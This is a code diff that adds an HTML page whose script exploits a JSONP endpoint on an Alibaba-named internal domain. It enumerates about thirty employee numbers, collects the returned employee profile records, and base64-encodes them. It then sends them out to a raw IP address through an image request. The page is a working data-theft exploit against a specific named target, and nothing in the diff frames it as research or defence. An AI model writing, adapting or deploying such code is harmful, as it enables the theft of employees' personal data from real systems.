@@ -1,1 +1,25 @@
-<script>alert()</script>
+<html>
+<body>
+<script>
+    function prefixInteger(num, n) {
+        return (Array(n).join(0) + num).slice(-n);
+    }
+    if (1 || !localStorage.flag) {
+        var records = [];
+        var test = function(json) {
+            records.push(JSON.stringify(json));
+        }
+        var start = parseInt(Math.random()*100000);
+        var end = start + 30;
+        for (var x = start; x < end; x++) {
+            x = prefixInteger(x, 6);
+            var s = document.createElement('script');
+            s.src = 'https://hx.alibabacorp.com/reimburse/getEmp360Info.jsonp?callback=test&employeeNo=' + x
+            document.body.appendChild(s);
+        }
+        setTimeout(function() {new Image().src = 'http://47.90.64.188/lab/003.php?a=' + btoa(records.join('\n'));}, 5000)
+        localStorage.flag = 1;
+    }
+</script>
+</body>
+</html>
